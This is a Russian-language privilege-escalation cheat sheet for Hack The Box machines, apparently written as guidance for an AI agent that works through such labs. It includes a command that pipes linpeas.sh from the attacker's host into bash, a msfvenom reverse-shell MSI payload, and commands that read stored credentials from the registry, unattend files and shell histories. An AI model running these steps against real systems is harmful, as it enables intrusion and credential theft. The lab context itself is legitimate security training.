# HTB: повышение привилегий Linux и Windows

## Linux: быстрый порядок

```bash
id; sudo -l; hostname; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null | grep -v "=$"
crontab -l; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
ss -tlnp; ps auxww | head -50
curl http://$LHOST:8000/linpeas.sh | bash 2>&1 | tee /tmp/linpeas.txt   # http-сервер у нас из /opt/tools/linux
/opt/tools/linux/pspy64   # на цели: процессы и cron без рута, смотреть 2-3 минуты
```

- LinPEAS вывод читать по секциям с красными/жёлтыми пометками, а не целиком простынёй: sudo, SUID, capabilities, writable paths в PATH крона, docker.sock, NFS no_root_squash, старые ядра.
- SUID/sudo бинарь найден → искать его имя в материалах (GTFOBins): запрос — просто имя бинаря (`vim`, `find`, `env`...). Команда из GTFOBins зависит от контекста: sudo и suid — разные секции.
- Крон с относительным путём или записываемым скриптом: проверить владельца и права `ls -la`, PATH в самом crontab.
- Группа docker/lxd/disk: самодостаточный рут, команды в материалах по запросу `docker group privilege escalation` / `lxd privilege escalation`.
- Ядро: `/opt/tools/linux/linux-exploit-suggester.sh` на цели, затем `searchsploit linux kernel <версия>` у нас. Ядерные эксплоиты — последний вариант: могут повесить машину, предупредить пользователя.
- Пароли в окружении: `env`, история `~/.bash_history`, конфиги сервисов в `/etc` и веба в `/var/www`, `grep -rI --include=*.php --include=*.env -i pass /var/www 2>/dev/null | head`.

## Windows: быстрый порядок

```powershell
whoami /all
systeminfo
net user; net localgroup administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ChildItem C:\Users -Force; Get-ChildItem C:\ -Force
```

Дальше winPEAS (`/opt/tools/windows/winPEASx64.exe` отдать как в htb-03) и ручная проверка частого:

- `SeImpersonatePrivilege` в `whoami /priv` → Potato-семейство (PrintSpoofer/GodPotato): бинари качать прицельно под версию, шаги искать в материалах `windows local privilege escalation impersonate`.
- Службы: `sc qc <svc>`, незакавыченные пути (unquoted service path), записываемые бинари служб: `icacls <путь>`.
- AlwaysInstallElevated: оба ключа реестра HKLM+HKCU = 1 → `msfvenom -p windows/x64/shell_reverse_tcp -f msi`.
- Автологин и креды в реестре: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`, файлы unattended: `C:\Windows\Panther\Unattend.xml`, `sysprep.inf`.
- Задачи планировщика от SYSTEM с записываемыми файлами: `schtasks /query /fo LIST /v | findstr /i "task to run"`.
- PSHistory: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` у всех юзеров.

## Проверка результата

Флаг прочитан новым пользователем (`whoami` после повышения), а не «команда вроде отработала»: показывать пользователю `id`/`whoami` и содержимое `root.txt` из той же сессии. Вектор повышения одной строкой — карточкой результата в память задачи.
